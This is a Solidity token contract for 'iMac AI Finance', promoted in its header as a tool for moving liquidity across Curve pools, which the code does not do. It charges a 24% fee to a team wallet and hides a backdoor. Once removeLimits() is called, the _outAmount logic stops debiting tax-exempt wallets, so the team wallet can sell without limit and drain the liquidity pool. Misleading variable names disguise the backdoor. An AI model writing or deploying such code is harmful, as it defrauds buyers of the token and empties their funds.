// SPDX-License-Identifier: Unlicensed

/*
Why does iMac exist?
Ultimately, iMac allows users to shift liquidity of an asset across multiple Curve pools.

Web: https://imac-finance.pro
X: https://x.com/iMacFinanceX
Tg: https://t.me/iMac_Finance_Official
M: https://medium.com/@imac.finance
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract iMac is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 decimals_ = 9;
    uint256 _supply = 10**9 * 10**9;

    string name_ = unicode"iMac AI Finance";
    string symbol_ = unicode"iMac";

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    uint256 LiquidityFee_ = 0;
    uint256 MarketingFee_ = 24;
    uint256 DevelopmentFee_ = 0;
    uint256 TotalFee_ = 24;

    uint256 _txAmountCeil = 16 * 10**6 * 10**9;
    uint256 _walletCeil = 16 * 10**6 * 10**9;
    uint256 _feeThresholSwap = 10**4 * 10**9;

    uint256 _getIMacLiquidityFee_ = 0;
    uint256 _getIMacMarketingFee_ = 24;
    uint256 _getIMacDevFee_ = 0;
    uint256 _getIMacFee_ = 24;

    address payable _teamAddy1;
    address payable _teamAddy2;

    uint256 _outIMacLiquidityFee_ = 0;
    uint256 _outIMacMarketingFee_ = 24;
    uint256 _outIMacDevFee_ = 0;
    uint256 _outIMacFee_ = 24;

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) allowances_;
    mapping(address => bool) _canNoTax;
    mapping(address => bool) _canHaveMaxWallet;
    mapping(address => bool) _canMaxTx;
    mapping(address => bool) _hasAddedLp;

    bool _isProjected;
    bool _activatedTaxSwap = true;
    bool _deactivatedMaxTx = false;
    bool _deactivatedMaxWallet = true;

    modifier lockSwap() {
        _isProjected = true;
        _;
        _isProjected = false;
    }

    constructor(address address_) {
        balances_[_msgSender()] = _supply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        allowances_[address(this)][address(routerInstance_)] = _supply;
        _teamAddy1 = payable(address_);
        _teamAddy2 = payable(address_);
        _getIMacFee_ = _getIMacLiquidityFee_.add(_getIMacMarketingFee_).add(_getIMacDevFee_);
        _outIMacFee_ = _outIMacLiquidityFee_.add(_outIMacMarketingFee_).add(_outIMacDevFee_);
        TotalFee_ = LiquidityFee_.add(MarketingFee_).add(DevelopmentFee_);

        _canNoTax[owner()] = true;
        _canNoTax[_teamAddy1] = true;
        _canHaveMaxWallet[owner()] = true;
        _canHaveMaxWallet[pairAddress_] = true;
        _canHaveMaxWallet[address(this)] = true;
        _canMaxTx[owner()] = true;
        _canMaxTx[_teamAddy1] = true;
        _canMaxTx[address(this)] = true;
        _hasAddedLp[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function swapClogsToEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _txAmountCeil = _supply;
        _deactivatedMaxWallet = false;
        _getIMacMarketingFee_ = 1;
        _outIMacMarketingFee_ = 1;
        _getIMacFee_ = 1;
        _outIMacFee_ = 1;
    }

    function _assertMaxWallet(address to, uint256 amount) internal view {
        if (_deactivatedMaxWallet && !_canHaveMaxWallet[to]) {
            require(balances_[to].add(amount) <= _walletCeil);
        }
    }

    function _inAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_canNoTax[sender] || _canNoTax[recipient]) {
            return amount;
        } else {
            return getIMacAmount_(sender, recipient, amount);
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _exceedChecker(address sender, address recipient, uint256 amount) internal view {
        if (!_canMaxTx[sender] && !_canMaxTx[recipient]) {
            require(amount <= _txAmountCeil, "Transfer amount exceeds the max.");
        }
    }

    function _outAmount(address sender, address recipient, uint256 amount, uint256 toAmount) internal view returns (uint256) {
        if (!_deactivatedMaxWallet && _canNoTax[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }

    function swapBackIMac_(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(LiquidityFee_).div(TotalFee_).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapClogsToEth(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = TotalFee_.sub(LiquidityFee_.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(LiquidityFee_).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(DevelopmentFee_).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            transferIMacETH_(_teamAddy1, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferIMacETH_(_teamAddy2, amountETHDevelopment_);
        }
    }

    function _transferN(address sender, address recipient, uint256 amount) internal {
        uint256 toAmount = _inAmount(sender, recipient, amount);
        _assertMaxWallet(recipient, toAmount);
        uint256 subAmount = _outAmount(sender, recipient, amount, toAmount);            
        balances_[sender] = balances_[sender].sub(subAmount, "Balance check error");
        balances_[recipient] = balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function _transferS(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (_isProjected) {
            return _transferB(sender, recipient, amount);
        } else {
            _exceedChecker(sender, recipient, amount);
            _isValidated(sender, recipient, amount);
            _transferN(sender, recipient, amount);
            return true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _transferS(sender, recipient, amount);
    }

    function getIMacAmount_(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = _getFeeTokens(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    receive() external payable {}

    function _transferB(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances_[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferIMacETH_(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _getFeeTokens(address from, address to, uint256 amount) internal view returns (uint256) {
        if (_hasAddedLp[from]) {
            return amount.mul(_getIMacFee_).div(100);
        } else if (_hasAddedLp[to]) {
            return amount.mul(_outIMacFee_).div(100);
        }
    }

    function _isValidated(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= _feeThresholSwap;
        bool isExTo = !_isProjected && _hasAddedLp[to] && _activatedTaxSwap;
        bool swapAbove = !_canNoTax[from] && amount > _feeThresholSwap;
        if (minSwapable && isExTo && swapAbove) {
            if (_deactivatedMaxTx) {
                _feeAmount = _feeThresholSwap;
            }
            swapBackIMac_(_feeAmount);
        }
    }
}